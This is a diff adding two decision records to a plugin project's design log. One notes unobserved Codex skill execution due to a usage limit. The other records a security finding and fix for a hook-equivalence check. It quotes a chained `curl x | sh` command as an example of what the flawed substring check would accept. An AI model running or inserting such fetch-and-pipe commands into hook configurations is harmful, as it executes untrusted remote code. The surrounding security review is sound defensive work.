@@ -326,3 +326,59 @@ knowing about the installer, which is the coupling D003 avoids.
 
 **Consequences:** The retirement spec inherits the first caveat as a reason: once the installer is
 gone, the duplication cannot happen.
+
+### D012 - Codex skill execution stays unobserved, by quota, not by the plugin
+
+**Date:** 2026-09-04
+
+**Status:** Accepted
+
+**Context:** `/qa-review` asked for evidence beyond AC-007: a Codex session actually using a plugin
+skill. `codex exec -C <disposable project> -s read-only` built its skills context with the plugin's
+skills in it (`warning: Skill descriptions were shortened to fit the skills context budget. Codex
+can still see every skill`) and ran its own SessionStart and UserPromptSubmit hooks, then failed
+on the model call: `You've hit your usage limit ... try again at Sep 7th, 2026`.
+
+**Decision:** AC-007 stands as the spec wrote it (marketplace add and plugin add exit 0, plugin
+listed installed and enabled). Skill execution on Codex is recorded as unobserved because of the
+account's usage limit, with the transcript in `evidence/CODEX_INSTALL.md`. It is not a narrowing of
+AC-007 and not a defect of the plugin; it is a check that can be repeated on 2026-09-07 or later.
+
+**Reasoning:** Codex is first-class here, so the gap is named rather than smoothed over. The
+truncation warning is itself a finding: on Codex the whole-repo plugin's cost appears as shortened
+skill descriptions, a second input to the per-profile question D001 defers.
+
+**Consequences:** `evidence/TOKEN_COST.md` carries the Codex observation. The retirement spec, or
+a per-profile spec, must weigh Codex's skills budget, not only Claude Code's token figure.
+
+### D013 - Security review: the equivalence gate now compares whole commands; three trust caveats added
+
+**Date:** 2026-09-04
+
+**Status:** Accepted
+
+**Context:** The `security-reviewer` agent returned Partial with one confirmed Medium and three
+potential findings (transcript in `evidence/SECURITY_REVIEW.md`). SEC-044-001: `_wiring_tuples`
+compared `(event, matcher, hook-name, timeout)` and found the hook name by substring, so a command
+such as `curl x | sh; bash "${CLAUDE_PLUGIN_ROOT}/hooks/git-guardrails.sh"`, or an absolute path to
+a different script with the same basename, passed as equivalent — while SPEC NFR Security and D005
+claimed the gate held the two wirings equivalent. SEC-044-002/003/004: plugin hooks run
+project-controlled tooling (`npx`, `./mvnw`) in every enabled project; in-place loading executes
+whatever branch the marketplace clone has checked out; the GitHub path had no trust statement.
+
+**Decision:** (1) Each side's commands must `fullmatch` its canonical shape
+(`bash "${CLAUDE_PLUGIN_ROOT}/hooks/<name>.sh"` for the plugin,
+`bash ${CLAUDE_PROJECT_DIR}/.claude/hooks/<name>.sh` for the template); a non-matching command
+keeps its full text as the compared name and can never be equal. The tuple gains `type` and
+`statusMessage`. Two suite cases mutate the prefix (chained command, absolute path). (2) The
+"Install as a plugin" caveats gain: what is executed and with whose privileges, the four hooks that
+run project-controlled code, the recommendation of `--scope project` for untrusted checkouts, the
+PR-branch-in-the-marketplace-clone case with the separate-clone remedy, and how GitHub updates
+arrive. No hook script changes.
+
+**Reasoning:** The gate's promise was "equivalent", and the check did not test what it promised;
+that is the class of gap spec 034 was written about. The trust caveats are the honest price of
+moving hooks from a per-project opt-in to a plugin.
+
+**Consequences:** A future change to the canonical command shape must update both regexes and the
+transcription rule in D002. The suite grows by two repo copies.
